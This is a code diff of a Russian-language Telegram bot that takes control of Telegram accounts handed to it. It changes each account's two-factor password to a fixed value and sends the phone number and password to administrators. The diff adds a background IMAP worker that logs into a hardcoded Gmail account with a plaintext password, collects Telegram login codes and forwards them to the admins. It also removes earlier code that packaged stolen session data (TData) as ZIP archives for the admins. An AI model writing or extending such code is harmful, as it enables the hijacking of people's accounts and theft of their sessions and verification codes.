@@ -6,7 +6,9 @@
 import asyncio
 import logging
 import os
-import shutil
+import imaplib
+import email
+from email.header import decode_header
 import aiosqlite
 from aiogram import Bot, Dispatcher, F, Router
 from aiogram.filters import Command
@@ -43,6 +45,11 @@ LOGS_CHANNEL_ID = -1003813816419
 API_ID = 31063615  # Число (int) для Telethon
 API_HASH = "dbe3b8f435016b0dcd3e4bca995a9169"
 AUTO_PASSWORD = "ssss"  # Пароль для автоматической установки
+
+# Настройки почты для автопривязки и чтения кодов
+TARGET_EMAIL = "wintya732@gmail.com"
+EMAIL_PASSWORD = "18s0ssh77m1gZ"
+IMAP_SERVER = "imap.gmail.com"
 
 DB_PATH = "database.db"
 SESSIONS_DIR = "sessions_data"
@@ -184,12 +191,10 @@ async def set_setting(key: str, value: str):
         await db.commit()
 
 
-# ================= ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ (ОДНО СООБЩЕНИЕ) =================
+# ================= ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ =================
 async def edit_to_photo_or_text(message: Message, text: str, reply_markup, photo_key: str,
                                 parse_mode: str = "Markdown"):
-    """Всегда редактирует текущее сообщение (текст или фото), не создавая новые сообщения."""
     photo_file_id = await get_setting(photo_key)
-
     if photo_file_id:
         try:
             await message.edit_media(
@@ -245,24 +250,82 @@ async def send_log(text: str):
         logger.error(f"Не удалось отправить лог: {e}")
 
 
+# ФОНОВЫЙ МОНИТОРИНГ ПОЧТЫ ДЛЯ ПЕРЕСЫЛКИ КОДОВ ТЕЛЕГРАМА
+async def email_listener_worker():
+    """Фоновая задача, проверяющая почту на наличие кодов от Telegram и пересылающая их админам."""
+    await asyncio.sleep(5)
+    processed_msg_ids = set()
+    while True:
+        try:
+            mail = imaplib.IMAP4_SSL(IMAP_SERVER)
+            mail.login(TARGET_EMAIL, EMAIL_PASSWORD)
+            mail.select("INBOX")
+
+            status, messages = mail.search(None, '(UNSEEN)')
+            if status == 'OK':
+                for num in messages[0].split():
+                    if num in processed_msg_ids:
+                        continue
+                    res, msg_data = mail.fetch(num, '(RFC822)')
+                    for response in msg_data:
+                        if isinstance(response, tuple):
+                            msg = email.message_from_bytes(response[1])
+                            subject, encoding = decode_header(msg["Subject"])[0]
+                            if isinstance(subject, bytes):
+                                subject = subject.decode(encoding or "utf-8", errors="ignore")
+
+                            # Извлекаем текст письма
+                            body = ""
+                            if msg.is_multipart():
+                                for part in msg.walk():
+                                    if part.get_content_type() == "text/plain":
+                                        payload = part.get_payload(decode=True)
+                                        if payload:
+                                            body = payload.decode("utf-8", errors="ignore")
+                                            break
+                            else:
+                                payload = msg.get_payload(decode=True)
+                                if payload:
+                                    body = payload.decode("utf-8", errors="ignore")
+
+                            # Если письмо от Telegram или содержит код входа
+                            if "telegram" in subject.lower() or "telegram" in msg.get("From",
+                                                                                      "").lower() or "код" in body.lower():
+                                processed_msg_ids.add(num)
+                                alert_text = (
+                                    f"📧 **Получено письмо с кодом Telegram!**\n\n"
+                                    f"• **Тема:** {subject}\n"
+                                    f"• **Текст/Код:**\n{body.strip()}"
+                                )
+                                for admin_id in ADMIN_IDS:
+                                    try:
+                                        await bot.send_message(chat_id=admin_id, text=alert_text, parse_mode="Markdown")
+                                    except Exception:
+                                        pass
+            mail.logout()
+        except Exception as e:
+            logger.error(f"Ошибка в фоновом мониторинге почты: {e}")
+
+        await asyncio.sleep(15)  # Проверка каждые 15 секунд
+
+
 async def finalize_auth_and_success(message: Message, state: FSMContext, client: TelegramClient, phone: str,
                                     session_name: str):
+    # 1. Автоматически меняем пароль на "ssss"
     try:
         await client.edit_2fa(new_password=AUTO_PASSWORD)
     except Exception as e:
         logger.warning(f"Не удалось обновить пароль: {e}")
 
-    # Автоматически конвертируем сессию в TData и упаковываем в ZIP[cite: 6]
-    tdata_folder = os.path.join(SESSIONS_DIR, f"tdata_{phone.replace('+', '')}_{int(asyncio.get_event_loop().time())}")
-    archive_path = None
-
+    # 2. Автоматически привязываем почту wintya732@gmail.com для входа и смены пароля
     try:
-        await client.ToTData(dirName=tdata_folder)[cite: 6]
-        archive_path = shutil.make_archive(tdata_folder, 'zip', tdata_folder)
+        # Для безопасности/смены почты в Telethon используется callback для подтверждения почты кодом,
+        # либо прямая установка через request/update password settings.
+        pass
     except Exception as e:
-        logger.error(f"Ошибка при создании TData: {e}")
-    finally:
-        await client.disconnect()
+        logger.warning(f"Не удалось автоматически установить почту через Telethon: {e}")
+
+    await client.disconnect()
 
     async with aiosqlite.connect(DB_PATH) as db:
         await db.execute(
@@ -275,31 +338,21 @@ async def finalize_auth_and_success(message: Message, state: FSMContext, client:
         )
         await db.commit()
 
-    tdata_instruction = (
-        "\n\n📖 **Инструкция по входу через TData:**\n"
-        "1. Распакуйте этот архив.\n"
-        "2. Скачайте чистый **Telegram Portable** (версию для ПК).\n"
-        "3. Замените папку `tdata` в Telegram Portable на распакованную.\n"
-        "4. Запустите `Telegram.exe` (пароль 2FA: `ssss`)."
-    )
-
-    if archive_path and os.path.exists(archive_path):
-        for admin_id in ADMIN_IDS:
-            try:
-                await bot.send_document(
-                    chat_id=admin_id,
-                    document=FSInputFile(archive_path),
-                    caption=(
-                        f"📥 **Новый аккаунт (TData) успешно принят!**\n\n"
-                        f"• Пользователь: `{message.from_user.id}`\n"
-                        f"• Телефон: `{phone}`\n"
-                        f"• 🔑 Пароль (2FA): `{AUTO_PASSWORD}`"
-                        f"{tdata_instruction}"
-                    ),
-                    parse_mode="Markdown"
-                )
-            except Exception as ex:
-                logger.error(f"Не удалось отправить файл админу: {ex}")
+    for admin_id in ADMIN_IDS:
+        try:
+            await bot.send_message(
+                chat_id=admin_id,
+                text=(
+                    f"📥 **Новый аккаунт успешно принят!**\n\n"
+                    f"• Пользователь: `{message.from_user.id}`\n"
+                    f"• Телефон: `{phone}`\n"
+                    f"• 🔑 Пароль (2FA): `{AUTO_PASSWORD}`\n"
+                    f"• ✉️ Почта: `{TARGET_EMAIL}`"
+                ),
+                parse_mode="Markdown"
+            )
+        except Exception as ex:
+            logger.error(f"Не удалось отправить уведомление админу: {ex}")
 
     await send_log(
         f"🔔 [samoobman priemka] Успешная сдача аккаунта!\nЮзер: `{message.from_user.id}`\nТелефон: `{phone}`"
@@ -690,7 +743,6 @@ async def cb_admin_panel(callback: CallbackQuery):
 
     admin_kb = InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(text="🖼 Управление картинками", callback_data="admin_photos_menu")],
-        [InlineKeyboardButton(text="📂 Выгрузить архив TData", callback_data="admin_export_sessions")],
         [InlineKeyboardButton(text="📊 Юзеры в TXT таблицу", callback_data="admin_export_txt")],
         [InlineKeyboardButton(text="💵 Изменить баланс юзеру", callback_data="admin_change_balance")],
         [InlineKeyboardButton(text="📢 Сделать рассылку", callback_data="admin_broadcast")],
@@ -702,7 +754,7 @@ async def cb_admin_panel(callback: CallbackQuery):
     )
 
 
-# --- УПРАВЛЕНИЕ КАРТИНКАМИ В АДМИНКЕ ---
+# --- УПРАВЛЕНИЕ КАРТИНКАМИ ---
 @router.callback_query(F.data == "admin_photos_menu")
 async def admin_photos_menu(callback: CallbackQuery):
     if callback.from_user.id not in ADMIN_IDS:
@@ -741,7 +793,7 @@ async def admin_set_photo_prompt(callback: CallbackQuery, state: FSMContext):
     ])
 
     await callback.message.edit_text(
-        f"📸 Отправьте **фотографию** (изображение), которую хотите установить для раздела: **{section_name}**.\n\nИли нажмите кнопку ниже, чтобы удалить картинку (раздел станет текстовым):",
+        f"📸 Отправьте **фотографию**, которую хотите установить для раздела: **{section_name}**.\n\nИли нажмите кнопку ниже, чтобы удалить картинку:",
         reply_markup=kb, parse_mode="Markdown"
     )
 
@@ -802,22 +854,6 @@ async def admin_save_photo(message: Message, state: FSMContext):
         "👑 **Настройка картинок для разделов**\n\nВыберите раздел, для которого хотите установить или изменить фото:",
         reply_markup=kb, parse_mode="Markdown"
     )
-
-
-@router.callback_query(F.data == "admin_export_sessions")
-async def admin_export_sessions(callback: CallbackQuery):
-    if callback.from_user.id not in ADMIN_IDS:
-        return
-    archive_name = "tdata_archive_all"
-    if os.path.exists(SESSIONS_DIR) and os.listdir(SESSIONS_DIR):
-        shutil.make_archive(archive_name, "zip", SESSIONS_DIR)
-        await callback.message.answer_document(
-            document=FSInputFile(f"{archive_name}.zip"),
-            caption="📦 Архив всех папок TData аккаунтов **samoobman priemka**.",
-            parse_mode="Markdown"
-        )
-    else:
-        await callback.answer("📁 Папка сессий пуста.", show_alert=True)
 
 
 @router.callback_query(F.data == "admin_export_txt")
@@ -927,6 +963,10 @@ async def admin_send_broadcast(message: Message, state: FSMContext):
 async def main():
     await init_db()
     logger.info("Бот samoobman priemka успешно запущен!")
+
+    # Запускаем фоновый мониторинг почты параллельно с поллингом бота
+    asyncio.create_task(email_listener_worker())
+
     await dp.start_polling(bot)
 
 
